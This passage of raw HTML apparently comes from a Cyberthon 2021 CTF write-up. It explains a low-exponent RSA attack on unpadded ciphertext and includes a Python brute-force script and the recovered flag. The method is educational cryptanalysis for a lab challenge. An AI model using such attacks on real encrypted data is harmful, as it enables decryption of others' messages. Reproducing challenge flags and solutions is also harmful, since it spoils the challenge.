data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(644,0)" style="stroke-width:3;"></path><path data-c="74" d="M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z" transform="translate(922,0)" style="stroke-width:3;"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(1311,0)" style="stroke-width:3;"></path><path data-c="A0" d="" transform="translate(1589,0)" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(4805.6,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(5516.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width:3;"></path></g><g data-mml-node="msup" transform="translate(6572.1,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(911,413) scale(0.707)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z" style="stroke-width:3;"></path></g></g><g data-mml-node="mo" transform="translate(8084.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(9085.1,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(9828.3,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(10328.5,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z" style="stroke-width:3;"></path></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top:0px;left:0px;clip:rect(1px, 1px, 1px, 1px);-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:absolute;padding:1px 0px 0px 0px;border:0px;display:block;overflow:hidden;width:100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi mathvariant="normal">âˆƒ</mi><mi>k</mi><mo>âˆˆ</mo><mrow data-mjx-texclass="ORD"><mi mathvariant="double-struck">Z</mi></mrow><mtext>Â s.t.Â </mtext><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mo>+</mo><mi>k</mi><mo>â‹…</mo><mi>N</mi></math></mjx-assistive-mml></mjx-container><p>where <code>c</code> denotes your ciphertext as an integer, <code>m</code> your plaintext message as an integer</p><p>Usually this is not an issue if you choose a larger public exponent <code>e</code>, because <code>k</code> would be beyond the reach of your average consumer computer.</p><p>But <code>e</code>=5 in this context, so there&#39;s a good chance we can easily recover it.</p><p>In order to recover the original message, we simply rearrange the equation $$\eqref{eq:two}$$ to get:</p><mjx-container tabindex="0" class="MathJax" jax="SVG" display="true" style="direction:ltr;display:block;text-align:center;margin:1em 0;position:relative;"><svg style="overflow:visible;min-height:1px;min-width:1px;vertical-align:-0.404ex;" xmlns="http://www.w3.org/2000/svg" width="15.879ex" height="2.851ex" role="img" focusable="false" viewBox="0 -1081.3 7018.4 1260" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mroot"><g><g data-mml-node="mrow" transform="translate(1020,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(655.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(1655.4,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(2398.7,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(2898.9,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z" style="stroke-width:3;"></path></g></g></g><g data-mml-node="mi" transform="translate(379,486.8) scale(0.5)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(0,171.3)"><path data-c="221A" d="M263 249Q264 249 315 130T417 -108T470 -228L725 302Q981 837 982 839Q989 850 1001 850Q1008 850 1013 844T1020 832V826L741 243Q645 43 540 -176Q479 -303 469 -324T453 -348Q449 -350 436 -350L424 -349L315 -96Q206 156 205 156L171 130Q138 104 137 104L111 130L263 249Z" style="stroke-width:3;"></path></g><rect width="3786.9" height="60" x="1020" y="961.2"></rect></g><g data-mml-node="mo" transform="translate(5084.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(6140.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width:3;"></path></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top:0px;left:0px;clip:rect(1px, 1px, 1px, 1px);-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:absolute;padding:1px 0px 0px 0px;border:0px;display:block;overflow:hidden;width:100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mroot><mrow><mi>c</mi><mo>âˆ’</mo><mi>k</mi><mo>â‹…</mo><mi>N</mi></mrow><mi>e</mi></mroot><mo>=</mo><mi>m</mi></math></mjx-assistive-mml></mjx-container><p>Or rather, since we know from $$\eqref{eq:one}$$ that the <code>c</code> given to us is smaller than <code>N</code>,</p><mjx-container tabindex="0" class="MathJax" jax="SVG" display="true" style="direction:ltr;display:block;text-align:center;margin:1em 0;position:relative;"><svg style="overflow:visible;min-height:1px;min-width:1px;vertical-align:-0.404ex;" xmlns="http://www.w3.org/2000/svg" width="15.879ex" height="2.851ex" role="img" focusable="false" viewBox="0 -1081.3 7018.4 1260" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mroot"><g><g data-mml-node="mrow" transform="translate(1020,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(655.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(1655.4,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(2398.7,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(2898.9,0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z" style="stroke-width:3;"></path></g></g></g><g data-mml-node="mi" transform="translate(379,486.8) scale(0.5)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z" style="stroke-width:3;"></path></g><g data-mml-node="mo" transform="translate(0,171.3)"><path data-c="221A" d="M263 249Q264 249 315 130T417 -108T470 -228L725 302Q981 837 982 839Q989 850 1001 850Q1008 850 1013 844T1020 832V826L741 243Q645 43 540 -176Q479 -303 469 -324T453 -348Q449 -350 436 -350L424 -349L315 -96Q206 156 205 156L171 130Q138 104 137 104L111 130L263 249Z" style="stroke-width:3;"></path></g><rect width="3786.9" height="60" x="1020" y="961.2"></rect></g><g data-mml-node="mo" transform="translate(5084.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width:3;"></path></g><g data-mml-node="mi" transform="translate(6140.4,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width:3;"></path></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top:0px;left:0px;clip:rect(1px, 1px, 1px, 1px);-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:absolute;padding:1px 0px 0px 0px;border:0px;display:block;overflow:hidden;width:100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mroot><mrow><mi>c</mi><mo>+</mo><mi>k</mi><mo>â‹…</mo><mi>N</mi></mrow><mi>e</mi></mroot><mo>=</mo><mi>m</mi></math></mjx-assistive-mml></mjx-container><p>(<code>k</code> is just some integer and this isn&#39;t math lesson so abuses of notation are a-ok)</p><h3 id="the-exploit" tabindex="-1">The Exploit <a class="header-anchor" href="#the-exploit" aria-label="Permalink to â€œThe Exploitâ€">â€‹</a></h3><p>Last thing left to do is to find <code>k</code>.</p><p>Just bruteforce ðŸ˜ƒ)).</p><p>(Unfortunately you will have to endure <code>Decimal</code> code since I was too lazy to get <code>Sagemath</code> to work and I did the exact same challenge last year...)</p><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> Crypto.Util.number </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> long_to_bytes,bytes_to_long</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> decimal </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> *</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">N</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">Decimal(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">0x</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">00a55869b46dfbe65a018f243c59bd8c1ea75bec4eb4ff1a0e3423a63c416583e5d43a16b9ec3f79f5a227e5579cf216d38515c36967935fd487a71438e167bef5f75a9eb0efa4c0451f0b052feb0614b4b51cf00c3320032017ba3b0e1ceff69aeb90131f8b3d80df14caf63f2a6d3ef40893360b0f12cd4e15a168b37d5f85e1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">e</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">Decimal(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">Decimal(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">5</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">getcontext().prec </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> 1000</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">with</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> open</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">flag.txt.encrypted</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">rb</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">as</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> f:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    c</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">bytes_to_long(f.read())</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">getcontext().prec </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> 1000</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">N</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">Decimal(N)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">E</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">Decimal(e)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">C</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">Decimal(c)</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">for</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> k </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">in</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> range</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1000</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">):</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    R</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">Decimal((k</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">N</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">C)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(E))</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">    if</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(R</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">!=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">R.to_integral_value()):</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">R for </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{}</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">: </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{}</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">.format(k,R))</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">Integer Form of R: </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{}</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">.format(R.to_integral_value()))</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">    else</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">        print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">Yay! </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{}</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">.format(long_to_bytes(R.to_integral_value())))</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">        break</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>And we get: <img src="/assets/Images/Cyberthon-2021/welp.png" alt=""></p><h3 id="flag" tabindex="-1">Flag! <a class="header-anchor" href="#flag" aria-label="Permalink to â€œFlag!â€">â€‹</a></h3><p><code>Cyberthon{f0rg0t_t0_p4d!}</code></p><p>p.s. welp1.0 is the exact same thing but $$k=0$$.</p><h2 id="encraptor-1-0" tabindex="-1">Encraptor 1.0 <a class="header-anchor" href="#encraptor-1-0" aria-label="Permalink to â€œEncraptor 1.0â€">â€‹</a></h2><div class="language- line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light dracula" 